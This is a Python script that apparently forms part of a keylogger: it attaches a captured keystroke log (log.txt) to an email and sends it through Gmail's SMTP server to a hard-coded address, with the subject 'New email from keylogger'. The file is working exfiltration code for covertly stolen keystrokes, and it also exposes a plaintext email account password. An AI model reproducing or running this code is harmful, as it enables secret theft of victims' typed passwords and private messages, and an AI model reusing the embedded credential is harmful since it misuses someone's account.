import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Listener

# Setup port number and server name

smtp_port = 587                 # Standard secure SMTP port
smtp_server = "smtp.gmail.com"  # Google SMTP Server

# Set up the email lists
email_from = "yasmineloussayef2019@gmail.com"
email_list = ["yasmineloussayef2019@gmail.com"]

# Define the password (better to reference externally)
pswd = "jean jklf nmmu osna"


# name the email subject
subject = "New email from keylogger"



# Define the email function 
def send_emails(email_list):

    for person in email_list:

        # Make the body of the email
        body = f"""
        **logs**

        """

       # make a MIME object to define parts of the email
        msg = MIMEMultipart()
        msg['From'] = email_from
        msg['To'] = person
        msg['Subject'] = subject

        # Attach the body of the message
        msg.attach(MIMEText(body, 'plain'))

        # Define the file to attach
        filename = "log.txt"

        # Open the file in python as a binary
        attachment= open(filename, 'rb')  # r for read and b for binary

        # Encode file as base 64
        attachment_package = MIMEBase('application', 'octet-stream')
        attachment_package.set_payload((attachment).read())
        encoders.encode_base64(attachment_package)
        attachment_package.add_header('Content-Disposition', "attachment; filename= " + filename)
        msg.attach(attachment_package)

        # Cast object as string
        text = msg.as_string()

        # Connect with the server
        print("Connecting to server...")
        TIE_server = smtplib.SMTP(smtp_server, smtp_port)
        TIE_server.starttls()
        TIE_server.login(email_from, pswd)
        print("Succesfully connected to server")
        print()


        # Send emails to "person" as list is iterated
        print(f"Sending email to: {person}...")
        TIE_server.sendmail(email_from, person, text)
        print(f"Email sent to: {person}")
        print()

    # Close the port
    TIE_server.quit()
# Run the function
send_emails(email_list)

